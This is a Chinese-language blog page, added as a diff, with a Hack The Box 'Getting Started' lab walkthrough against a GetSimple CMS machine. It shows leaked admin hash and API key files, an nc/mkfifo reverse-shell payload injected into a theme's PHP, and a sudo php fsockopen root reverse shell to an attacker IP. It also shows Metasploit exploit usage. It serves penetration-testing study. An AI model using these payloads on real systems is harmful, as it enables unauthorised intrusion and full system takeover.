@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="GETSTART扫端口nmap扫端口。 12345678910111213141516171819202122232425262728293031323334353637383940414243Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-13 01:51 EDTNmap scan report for 10.129.246.235Ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB渗透学习-GETSTART">
+<meta property="og:url" content="http://example.com/2024/08/12/HTB-1-GETSTART/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="GETSTART扫端口nmap扫端口。 12345678910111213141516171819202122232425262728293031323334353637383940414243Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-13 01:51 EDTNmap scan report for 10.129.246.235Ho">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-11T16:16:33.000Z">
+<meta property="article:modified_time" content="2025-02-26T15:54:51.218Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="渗透测试学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB渗透学习-GETSTART</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/08/18/HTB-2-NMAP/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/08/12/HTB%E5%88%B7%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/12/HTB-1-GETSTART/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/12/HTB-1-GETSTART/&text=HTB渗透学习-GETSTART"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/12/HTB-1-GETSTART/&is_video=false&description=HTB渗透学习-GETSTART"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB渗透学习-GETSTART&body=Check out this article: http://example.com/2024/08/12/HTB-1-GETSTART/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/12/HTB-1-GETSTART/&name=HTB渗透学习-GETSTART&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/12/HTB-1-GETSTART/&t=HTB渗透学习-GETSTART"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GETSTART"><span class="toc-number">1.</span> <span class="toc-text">GETSTART</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.</span> <span class="toc-text">扫端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%85%A5admin%E5%90%8E%E5%8F%B0%EF%BC%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">登入admin后台，反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8MetaSploit"><span class="toc-number">1.3.</span> <span class="toc-text">直接使用MetaSploit</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB渗透学习-GETSTART
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-11T16:16:33.000Z" class="dt-published" itemprop="datePublished">2024-08-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" rel="tag">渗透测试学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="GETSTART"><a href="#GETSTART" class="headerlink" title="GETSTART"></a>GETSTART</h1><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><p>nmap扫端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 01:51 EDT</span><br><span class="line">Nmap scan report for 10.129.246.235</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 290.61 seconds</span><br><span class="line">```                                                   </span><br><span class="line"></span><br><span class="line">一个HTTP服务，一个SSH服务，先看HTTP服务</span><br><span class="line"></span><br><span class="line">## 查看HTTP服务</span><br><span class="line"></span><br><span class="line">直接浏览器打开，发现是一个CMS，叫GetSimple。</span><br><span class="line"></span><br><span class="line">### 扫后台</span><br><span class="line"></span><br><span class="line">dirsearch扫后台，发现一些可能有问题的路径</span><br><span class="line"></span><br><span class="line">``` plain</span><br><span class="line">[02:06:43] 301 -  316B  - /admin  -&gt;  http://10.129.246.235/admin/          </span><br><span class="line">[02:06:45] 200 -    1KB - /admin/                                           </span><br><span class="line">[02:06:46] 302 -    0B  - /admin/download.php  -&gt;  index.php?redirect=download.php?</span><br><span class="line">[02:06:47] 200 -    1KB - /admin/index.php                                  </span><br><span class="line">[02:06:50] 302 -    0B  - /admin/upload.php  -&gt;  index.php?redirect=upload.php?</span><br><span class="line">[02:07:14] 301 -  318B  - /backups  -&gt;  http://10.129.246.235/backups/      </span><br><span class="line">[02:07:14] 200 -  479B  - /backups/                                         </span><br><span class="line">[02:07:38] 301 -  315B  - /data  -&gt;  http://10.129.246.235/data/            </span><br><span class="line">[02:07:38] 200 -  514B  - /data/                                            </span><br><span class="line">[02:07:38] 200 -  509B  - /data/cache/                                      </span><br><span class="line">[02:08:09] 200 -   12KB - /LICENSE.txt                                      </span><br><span class="line">[02:08:44] 200 -  536B  - /plugins/                                         </span><br><span class="line">[02:08:44] 301 -  318B  - /plugins  -&gt;  http://10.129.246.235/plugins/</span><br><span class="line">[02:08:52] 200 -  889B  - /readme.txt                                       </span><br><span class="line">[02:08:55] 200 -   32B  - /robots.txt                                       </span><br><span class="line">[02:08:58] 403 -  279B  - /server-status/                                   </span><br><span class="line">[02:08:58] 403 -  279B  - /server-status                                    </span><br><span class="line">[02:09:02] 200 -  257B  - /sitemap.xml                                      </span><br><span class="line">[02:09:12] 301 -  316B  - /theme  -&gt;  http://10.129.246.235/theme/ </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x2F;backups里面啥都没有</li>
+<li>&#x2F;data 中有一个 &#x2F;cache 文件夹，含有两个txt文档，其中一个文档存在cms版本 3.3.15<ul>
+<li>&#x2F;cache<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;0&quot;,&quot;latest&quot;:&quot;3.3.16&quot;,&quot;your_version&quot;:&quot;3.3.15&quot;,&quot;message&quot;:&quot;You have an old version - please upgrade&quot;&#125;</span><br></pre></td></tr></table></figure></li>
+<li>&#x2F;data&#x2F;other&#x2F;plugins.xml 里有两个插件登录<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span>anonymous_data.php<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span>InnovationPlugin.php<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>&#x2F;data&#x2F;other&#x2F;authorization.xml 里直接泄露API key<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">apikey</span>&gt;</span>4f399dc72ff8e619e327800f851e9986<span class="tag">&lt;/<span class="name">apikey</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>&#x2F;data&#x2F;uploads 疑似为上传路径</li>
+<li>&#x2F;data&#x2F;users&#x2F;admin.xml 直接泄露admin的账号密码，但这里的密码疑似是hash后的，因为直接试不行；hashcat后疑似是SHA1；SHA1反查后居然直接就是admin<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">USR</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">USR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">NAME</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PWD</span>&gt;</span>d033e22ae348aeb5660fc2140aec35850c4da997<span class="tag">&lt;/<span class="name">PWD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">EMAIL</span>&gt;</span>admin@gettingstarted.com<span class="tag">&lt;/<span class="name">EMAIL</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTMLEDITOR</span>&gt;</span>1<span class="tag">&lt;/<span class="name">HTMLEDITOR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TIMEZONE</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LANG</span>&gt;</span>en_US<span class="tag">&lt;/<span class="name">LANG</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="登入admin后台，反弹shell"><a href="#登入admin后台，反弹shell" class="headerlink" title="登入admin后台，反弹shell"></a>登入admin后台，反弹shell</h3><p>这边直接通过泄露的信息登入admin后台，先不管其他的，看一圈后发现能修改Theme-Edit Theme</p>
+<p>直接修改Theme，往Theme的代码里插一个phpinfo();，然后应用后成功执行。</p>
+<p>尝试写webshell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> (<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.55 9999 &gt;/tmp/f&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>保存，刷新，成功收到shell，同时使用pty获得可读性更好的shell，弄个bash出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>获得用户flag。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找到一个有写权限的文件夹，本地开HTTP服务，靶机wget，传LinEnum.sh到靶机上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash LinEnum.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现可能可以用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] We can sudo without supplying a password!</span><br><span class="line">Matching Defaults entries for www-data on gettingstarted:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on gettingstarted:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Possible sudo pwnage!</span><br><span class="line">/usr/bin/php</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;usr&#x2F;bin&#x2F;php 居然可以无密码sudo</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.10.16.55&quot;,9997); exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接反弹root shell到攻击机上，成功得到root权限的shell，读rootflag。</p>
+<h2 id="直接使用MetaSploit"><a href="#直接使用MetaSploit" class="headerlink" title="直接使用MetaSploit"></a>直接使用MetaSploit</h2><p>msfconsole里直接search getsimple，发现两个可用的exp，先用第二个试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 1</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/http/getsimplecms_unauth_code_exec) &gt; set rhosts 10.129.246.235</span><br><span class="line">rhosts =&gt; 10.129.246.235</span><br><span class="line">msf6 exploit(multi/http/getsimplecms_unauth_code_exec) &gt; set lhost 10.10.16.55</span><br><span class="line">lhost =&gt; 10.10.16.55</span><br><span class="line">msf6 exploit(multi/http/getsimplecms_unauth_code_exec) &gt; show options</span><br></pre></td></tr></table></figure>
+
+<p>成功得到用户权限的meterpreter shell。后面提权即可</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GETSTART"><span class="toc-number">1.</span> <span class="toc-text">GETSTART</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.</span> <span class="toc-text">扫端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%85%A5admin%E5%90%8E%E5%8F%B0%EF%BC%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">登入admin后台，反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8MetaSploit"><span class="toc-number">1.3.</span> <span class="toc-text">直接使用MetaSploit</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/12/HTB-1-GETSTART/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/12/HTB-1-GETSTART/&text=HTB渗透学习-GETSTART"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/12/HTB-1-GETSTART/&is_video=false&description=HTB渗透学习-GETSTART"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB渗透学习-GETSTART&body=Check out this article: http://example.com/2024/08/12/HTB-1-GETSTART/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/12/HTB-1-GETSTART/&title=HTB渗透学习-GETSTART"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/12/HTB-1-GETSTART/&name=HTB渗透学习-GETSTART&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/12/HTB-1-GETSTART/&t=HTB渗透学习-GETSTART"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2025
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
